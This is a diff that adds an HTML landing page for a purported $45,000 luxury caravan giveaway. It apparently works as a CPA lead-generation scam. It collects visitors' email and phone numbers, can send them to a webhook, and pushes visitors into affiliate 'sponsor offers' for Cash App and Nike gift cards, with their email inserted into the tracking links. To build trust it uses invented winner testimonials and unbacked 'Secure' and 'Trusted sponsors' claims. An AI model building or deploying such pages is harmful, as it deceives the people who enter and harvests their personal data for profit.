@@ -1,0 +1,362 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Win a Luxury Caravan — Enter to Win</title>
+  <meta name="description" content="Enter to win a $45,000 luxury caravan — complete one quick sponsor email registration (~30–90s) to enter.">
+  <meta name="robots" content="index,follow">
+  <meta name="theme-color" content="#07112a">
+
+  <!-- Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    /*
+      Luxury redesign:
+      - Midnight navy background with warm gold accent
+      - Large, clear CTA, improved spacing and typography
+      - Inputs set to 16px to avoid iOS auto-zoom
+      - Responsive images via <picture> & srcset
+      - Mobile-first: sticky CTA, modal full-screen on small, sticky hides during keyboard
+    */
+    :root{
+      --bg:#07112a;            /* deep midnight */
+      --card:#0f1724;          /* slightly lighter card */
+      --muted:#9aa7b2;
+      --gold:#f6c85f;          /* warm gold accent */
+      --accent:#7be0d9;        /* teal highlight */
+      --text:#eef6fb;
+      --glass: rgba(255,255,255,0.03);
+      --radius:14px;
+      --maxw:1100px;
+    }
+    html,body{height:100%;margin:0;background:linear-gradient(180deg,var(--bg),#031023);color:var(--text);font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;-webkit-font-smoothing:antialiased; -webkit-text-size-adjust:100%;}
+    *,*::before,*::after{box-sizing:border-box}
+    img{display:block;max-width:100%;height:auto}
+    a{color:inherit}
+
+    .wrap{max-width:var(--maxw);margin:18px auto;padding:16px}
+    header.top{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;border:1px solid rgba(255,255,255,0.02)}
+    .brand{display:flex;gap:12px;align-items:center}
+    .logo{width:56px;height:56px;border-radius:10px;object-fit:cover;border:2px solid rgba(255,255,255,0.03)}
+    .brand h1{font-size:18px;margin:0;font-weight:700;letter-spacing:-0.2px}
+    .brand p{margin:0;color:var(--muted);font-size:13px}
+
+    nav{display:flex;gap:12px;align-items:center}
+    nav a{font-size:14px;color:var(--muted);padding:8px;border-radius:8px}
+    nav a:hover{color:var(--gold)}
+
+    .hero{display:grid;grid-template-columns:1fr 420px;gap:20px;align-items:start;margin-top:18px}
+    @media (max-width:980px){ .hero{grid-template-columns:1fr} }
+
+    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:22px;border-radius:var(--radius);border:1px solid rgba(255,255,255,0.03)}
+    .kicker{display:inline-block;background:linear-gradient(90deg,var(--gold),#ffb86b);color:#07112a;padding:8px 12px;border-radius:999px;font-weight:800;margin-bottom:12px}
+    .title{font-size:30px;line-height:1.02;margin:6px 0 10px 0;font-weight:800}
+    .subtitle{color:var(--muted);margin-bottom:16px;font-size:15px}
+
+    .cta-row{display:flex;gap:12px;flex-wrap:wrap}
+    .btn-primary{background:linear-gradient(90deg,var(--gold),#ffd88f);color:#07112a;padding:13px 18px;border-radius:999px;border:none;font-weight:800;cursor:pointer;box-shadow:0 10px 30px rgba(246,200,95,0.08)}
+    .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:12px 14px;border-radius:10px;color:var(--muted);cursor:pointer}
+
+    .stats{display:flex;gap:14px;color:var(--muted);font-size:13px;margin-top:12px;flex-wrap:wrap}
+    .stat strong{display:block;color:var(--text);font-weight:700}
+
+    /* prize column */
+    .prize{display:flex;flex-direction:column;align-items:center;gap:12px;text-align:center}
+    .prize .image-wrap{width:100%;height:0;padding-bottom:62%;position:relative;border-radius:12px;overflow:hidden;background:linear-gradient(180deg,#021022,#051631)}
+    .prize img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block}
+    .value-bubble{background:linear-gradient(90deg,#e8fdfb,#bff7f0);padding:8px 12px;border-radius:999px;color:#00201a;font-weight:800}
+
+    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:18px}
+    @media (max-width:980px){ .features{grid-template-columns:repeat(2,1fr)} }
+    @media (max-width:520px){ .features{grid-template-columns:1fr} }
+    .feature{background:var(--glass);padding:12px;border-radius:10px;text-align:left;color:var(--muted);min-height:64px;display:flex;flex-direction:column;justify-content:center}
+
+    .testimonials{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:18px}
+    @media (max-width:720px){ .testimonials{grid-template-columns:1fr} }
+    .testimonial{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:12px;border-radius:10px;color:var(--muted);border:1px solid rgba(255,255,255,0.02)}
+
+    footer{margin-top:18px;text-align:center;color:var(--muted);font-size:13px}
+
+    /* Sticky CTA for mobile */
+    .sticky-cta{position:fixed;left:50%;transform:translateX(-50%);bottom:16px;background:linear-gradient(90deg,var(--gold),#ffd88f);color:#07112a;padding:12px 18px;border-radius:999px;border:none;box-shadow:0 14px 40px rgba(246,200,95,0.08);font-weight:800;z-index:60;display:none}
+    @media (max-width:980px){ .sticky-cta{display:block;width:calc(100% - 32px);left:16px;transform:none} }
+
+    /* Modal */
+    .modal-back{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(2,6,23,0.6);z-index:9999;padding:12px}
+    .modal{width:100%;max-width:520px;background:linear-gradient(180deg,#07112a,#0a1730);border-radius:12px;padding:18px;border:1px solid rgba(255,255,255,0.02);color:var(--text)}
+    .modal h3{color:var(--gold);margin:6px 0}
+    .modal p{color:var(--muted)}
+    .form-row{display:flex;gap:10px;margin-top:12px}
+    input[type="email"], input[type="tel"], textarea, select {
+      width:100%;
+      padding:12px 14px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.04);
+      background:rgba(255,255,255,0.02);
+      color:var(--text);
+      font-size:16px; /* critical to stop iOS auto-zoom */
+      outline:none;
+    }
+    input::placeholder{color:rgba(238,246,251,0.55)}
+    .offers{margin-top:12px;display:none}
+    .offer{display:flex;justify-content:space-between;align-items:center;padding:12px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.02);cursor:pointer}
+    .progress{height:8px;background:rgba(255,255,255,0.02);border-radius:12px;margin-top:12px;overflow:hidden}
+    .progress > span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--gold),#ffd88f);transition:width .35s}
+
+    /* accessibility */
+    .sr-only{position:absolute;left:-9999px;top:auto;width:1px;height:1px;overflow:hidden}
+    button{min-height:44px;touch-action:manipulation}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header class="top" role="banner">
+      <div class="brand">
+        <img class="logo" src="https://i.postimg.cc/Nj2Yjk8w/frankia-now-sun-g24-01-630x420.jpg" alt="Caravan">
+        <div>
+          <h1>Luxury Caravan Giveaway</h1>
+          <p>Win a premium caravan — valued $45,000</p>
+        </div>
+      </div>
+
+      <nav>
+        <a href="https://www.m4d.fun/caravan">Home</a>
+        <a href="#features">Features</a>
+        <a href="#testimonials">Winners</a>
+        <a href="#terms">Terms</a>
+      </nav>
+    </header>
+
+    <main class="hero" role="main">
+      <section class="card" aria-labelledby="heroTitle">
+        <div class="kicker">LIMITED ENTRY • FREE</div>
+        <h2 id="heroTitle" class="title">Win a Luxury Caravan — Quick 2-Step Entry</h2>
+        <p class="subtitle">Complete one sponsor email registration (~30–90s) to get an instant entry. No purchase required. Use valid info to qualify.</p>
+
+        <div class="cta-row">
+          <button id="openModalBtn" class="btn-primary" aria-haspopup="dialog">Enter Giveaway — Start</button>
+          <button id="howBtn" class="btn-ghost">How it works</button>
+        </div>
+
+        <div class="stats" aria-hidden="false">
+          <div class="stat"><strong>$45,000</strong><small>Prize value</small></div>
+          <div class="stat"><strong>1–3 min</strong><small>Avg completion</small></div>
+          <div class="stat"><strong>Secure</strong><small>Trusted sponsors</small></div>
+        </div>
+
+        <div id="features" class="features" aria-hidden="false">
+          <div class="feature"><strong>Comfort for 6</strong><small>Spacious sleeping & living</small></div>
+          <div class="feature"><strong>Full Kitchen</strong><small>Modern appliances</small></div>
+          <div class="feature"><strong>Private Bath</strong><small>Shower, toilet & vanity</small></div>
+          <div class="feature"><strong>Entertainment</strong><small>Smart TV & audio</small></div>
+          <div class="feature"><strong>Storage</strong><small>Plenty of space</small></div>
+          <div class="feature"><strong>Outdoor Awning</strong><small>Relax outside</small></div>
+        </div>
+
+        <div id="testimonials" class="testimonials" aria-hidden="false">
+          <div class="testimonial">
+            <strong>“I couldn't believe it when I won!”</strong>
+            <p class="small">— Sarah M., recent winner</p>
+          </div>
+          <div class="testimonial">
+            <strong>“Fast & simple registration.”</strong>
+            <p class="small">— Robert T.</p>
+          </div>
+        </div>
+
+        <div id="terms" style="margin-top:12px;color:var(--muted)">By entering you agree to the <a href="#" style="text-decoration:underline;color:var(--gold)">Terms & Privacy</a>. Promotion not affiliated with Google.</div>
+      </section>
+
+      <aside class="card prize" aria-label="Prize preview">
+        <div class="image-wrap" aria-hidden="false">
+          <picture>
+            <!-- NOTE: If you have real optimized images, replace URLs below -->
+            <source type="image/webp" srcset="https://i.postimg.cc/KYLZJD4N/frankia-now-peach-g24-01.jpg 480w" sizes="100vw">
+            <img src="https://i.postimg.cc/KYLZJD4N/frankia-now-peach-g24-01.jpg" alt="Luxury Caravan" loading="lazy">
+          </picture>
+        </div>
+
+        <div style="font-weight:700;font-size:18px">2024 Premium Luxury Caravan</div>
+        <div class="small" style="color:var(--muted);margin-top:4px">Modern amenities • Sleeps 6</div>
+        <div class="value-bubble" style="margin-top:10px">VALUE: $45,000</div>
+        <div style="margin-top:12px" class="small">🔒 Secure • ⏱ Fast • 🎟 Instant entry</div>
+      </aside>
+    </main>
+
+    <footer style="text-align:center;margin-top:18px;color:var(--muted)"><small>© 2025 Your CPA Business</small></footer>
+  </div>
+
+  <!-- sticky mobile CTA -->
+  <button id="stickyCTA" class="sticky-cta" aria-label="Enter giveaway">Enter & Start →</button>
+
+  <!-- Modal / locker -->
+  <div id="modalBack" class="modal-back" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" role="document" aria-labelledby="modalTitle">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <h3 id="modalTitle">Quick Verification — Step 1</h3>
+        <button id="closeBtn" class="btn-ghost" aria-label="close">Close</button>
+      </div>
+      <p class="small">Enter your email to save your spot. You'll then be shown sponsor offers — complete one quick email registration (~30–90s) to confirm your entry.</p>
+
+      <label class="small" for="leadEmail" style="margin-top:12px">Email</label>
+      <input id="leadEmail" type="email" placeholder="you@example.com" autocomplete="email" inputmode="email">
+
+      <label class="small" for="leadPhone" style="margin-top:8px">Phone (optional)</label>
+      <input id="leadPhone" type="tel" placeholder="+1 555 555 5555" autocomplete="tel" inputmode="tel">
+
+      <div class="form-row" style="margin-top:12px">
+        <button id="saveContinue" class="btn-primary" style="flex:1">Save & Continue</button>
+        <button id="openOffers" class="btn-ghost" style="width:120px">Offers</button>
+      </div>
+
+      <div id="progressWrap" class="progress" style="display:none;">
+        <span id="progressBar" style="width:0%"></span>
+      </div>
+
+      <div id="offers" class="offers" aria-live="polite">
+        <div class="small" style="margin-top:10px">Choose an offer and complete its email registration to confirm your entry:</div>
+        <div id="offersList" style="margin-top:8px"></div>
+      </div>
+
+      <div style="margin-top:12px" class="small">We only use your info to confirm the entry and for legitimate follow-up. We do not sell your data.</div>
+    </div>
+  </div>
+
+  <script>
+    // CONFIG: replace WEBHOOK_URL and SPONSORS with your values
+    const WEBHOOK_URL = ""; // e.g. "https://hooks.zapier.com/hooks/catch/XXXXX/YYYYY"
+    const SPONSORS = [
+      { title: "CTConnect — Cash App", url: "https://smrturl.co/a/sac7b66fcac/663?s1=" },
+      { title: "CTConnect — Nike GiftCard", url: "https://smrturl.co/a/sac7b66fcac/14565?s1=" }
+    ];
+
+    // Elements
+    const openModalBtn = document.getElementById('openModalBtn');
+    const stickyCTA = document.getElementById('stickyCTA');
+    const modalBack = document.getElementById('modalBack');
+    const closeBtn = document.getElementById('closeBtn');
+    const saveContinue = document.getElementById('saveContinue');
+    const openOffers = document.getElementById('openOffers');
+    const leadEmail = document.getElementById('leadEmail');
+    const leadPhone = document.getElementById('leadPhone');
+    const progressWrap = document.getElementById('progressWrap');
+    const progressBar = document.getElementById('progressBar');
+    const offers = document.getElementById('offers');
+    const offersList = document.getElementById('offersList');
+    const howBtn = document.getElementById('howBtn');
+
+    // Utility
+    function isEmail(v){ return typeof v==='string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()); }
+    function postJSON(url, body){ return fetch(url, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); }
+    function appendS1(url,email){ try{ const u=new URL(url); if(!u.searchParams.get('s1')) u.searchParams.set('s1', encodeURIComponent(email)); return u.toString(); }catch(e){ return url + encodeURIComponent(email); } }
+    function openInNewTab(url){ try{ const a=document.createElement('a'); a.href=url; a.target='_blank'; a.rel='noopener noreferrer'; document.body.appendChild(a); a.click(); document.body.removeChild(a); }catch(e){ window.open(url,'_blank','noopener'); } }
+
+    // Modal functions
+    function showModal(){ modalBack.style.display='flex'; modalBack.setAttribute('aria-hidden','false'); document.body.style.overflow='hidden'; setTimeout(()=> leadEmail.focus(),220); }
+    function hideModal(){ modalBack.style.display='none'; modalBack.setAttribute('aria-hidden','true'); document.body.style.overflow='auto'; resetOffersUI(); }
+
+    openModalBtn && openModalBtn.addEventListener('click', showModal);
+    stickyCTA && stickyCTA.addEventListener('click', showModal);
+    closeBtn && closeBtn.addEventListener('click', hideModal);
+    howBtn && howBtn.addEventListener('click', ()=> alert('Enter your email → choose an offer → complete the sponsor registration (30–90s) to confirm entry.'));
+
+    // Clicking backdrop closes
+    modalBack.addEventListener('click', (e)=> { if(e.target === modalBack) hideModal(); });
+    document.addEventListener('keydown', (e)=> { if(e.key === 'Escape' && modalBack.style.display === 'flex') hideModal(); });
+
+    // Save lead and show offers
+    saveContinue.addEventListener('click', async ()=>{
+      const email = (leadEmail.value||'').trim();
+      const phone = (leadPhone.value||'').trim();
+      if(!isEmail(email)){ leadEmail.focus(); leadEmail.style.borderColor='#ff7a43'; return; }
+      leadEmail.style.borderColor='';
+
+      const lead = { email, phone, ts: new Date().toISOString(), page: location.href };
+      try{ localStorage.setItem('caravan_lead', JSON.stringify(lead)); }catch(e){}
+      if(WEBHOOK_URL){ postJSON(WEBHOOK_URL, Object.assign({}, lead, { event:'lead_saved' })).catch(()=>{}); }
+
+      // show progress then offers
+      showProgressThenOffers();
+    });
+
+    openOffers && openOffers.addEventListener('click', ()=>{
+      const raw = localStorage.getItem('caravan_lead');
+      if(!raw && !confirm('We recommend saving your email first so your entry is credited. Open offers without saving?')) return;
+      renderOffers();
+      offers.style.display='block';
+    });
+
+    function showProgressThenOffers(){
+      progressWrap.style.display='block';
+      offers.style.display='none';
+      progressBar.style.width='0%';
+      let p=0;
+      const t=setInterval(()=>{ p += 12 + Math.random()*18; if(p>100)p=100; progressBar.style.width = p+'%'; if(p>=100){ clearInterval(t); progressWrap.style.display='none'; renderOffers(); offers.style.display='block'; } }, 140);
+    }
+
+    function renderOffers(){
+      offersList.innerHTML='';
+      SPONSORS.forEach((s,idx)=>{
+        const row = document.createElement('div');
+        row.className='offer';
+        row.innerHTML = `<div><div style="font-weight:700">${s.title}</div><div style="font-size:13px;color:var(--muted)">Email registration • Avg 1–3 min</div></div><div style="display:flex;gap:8px;align-items:center"><div style="font-size:12px;color:var(--muted)">${idx===0?'Recommended':'Popular'}</div><div style="background:linear-gradient(90deg,#00e5ff,#0099ff);color:#000;padding:8px 10px;border-radius:999px;font-weight:700">Open</div></div>`;
+        row.addEventListener('click', ()=> selectOffer(s));
+        offersList.appendChild(row);
+      });
+    }
+
+    async function selectOffer(sponsor){
+      let lead = null;
+      try{ lead = JSON.parse(localStorage.getItem('caravan_lead')||'null'); }catch(e){ lead=null; }
+      if(!lead || !isEmail(lead.email)){ alert('Please save your email first so your entry is credited.'); return; }
+
+      // Send lead+offer to webhook (optional) - non-blocking
+      if(WEBHOOK_URL){ postJSON(WEBHOOK_URL, Object.assign({}, lead, { event:'offer_click', offer: sponsor.title, offer_url: sponsor.url, ts: new Date().toISOString() })).catch(()=>{}); }
+
+      // Append s1 param if possible
+      const redirect = appendS1(sponsor.url, lead.email);
+      openInNewTab(redirect);
+
+      setTimeout(()=>{ alert('Offer opened in a new tab. Complete the sponsor registration to confirm your entry.'); hideModal(); }, 700);
+    }
+
+    function resetOffersUI(){ progressWrap.style.display='none'; progressBar.style.width='0%'; offers.style.display='none'; offersList.innerHTML=''; }
+
+    // Restore saved lead
+    (function restore(){
+      try{ const raw = localStorage.getItem('caravan_lead'); if(raw){ const parsed = JSON.parse(raw); if(parsed.email) leadEmail.value = parsed.email; if(parsed.phone) leadPhone.value = parsed.phone; } }catch(e){}
+    })();
+
+    // Sticky CTA: hide when keyboard opens (mobile)
+    (function stickyBehavior(){
+      const sticky = document.getElementById('stickyCTA');
+      function update(){
+        if(window.visualViewport){
+          if(window.visualViewport.height < screen.availHeight * 0.65) sticky.style.display='none';
+          else sticky.style.display = window.matchMedia('(max-width:980px)').matches ? 'block' : 'none';
+        } else {
+          sticky.style.display = window.matchMedia('(max-width:980px)').matches ? 'block' : 'none';
+        }
+      }
+      window.addEventListener('resize', update);
+      window.addEventListener('orientationchange', update);
+      window.addEventListener('focusin', update);
+      window.addEventListener('focusout', update);
+      update();
+    })();
+
+    // auto open ?open=1
+    (function autoOpen(){ try{ const u = new URL(location.href); if(u.searchParams.get('open')==='1') showModal(); }catch(e){} })();
+
+    // expose helper for debug
+    function showModal(){ modalBack.style.display='flex'; modalBack.setAttribute('aria-hidden','false'); document.body.style.overflow='hidden'; setTimeout(()=> leadEmail.focus(),220); }
+    function hideModal(){ modalBack.style.display='none'; modalBack.setAttribute('aria-hidden','true'); document.body.style.overflow='auto'; resetOffersUI(); }
+    window.__landing = { showModal, hideModal, renderOffers };
+
+    // wire sticky CTA click (element exists)
+    document.getElementById('stickyCTA')?.addEventListener('click', showModal);
+  </script>
+</body>
+</html>
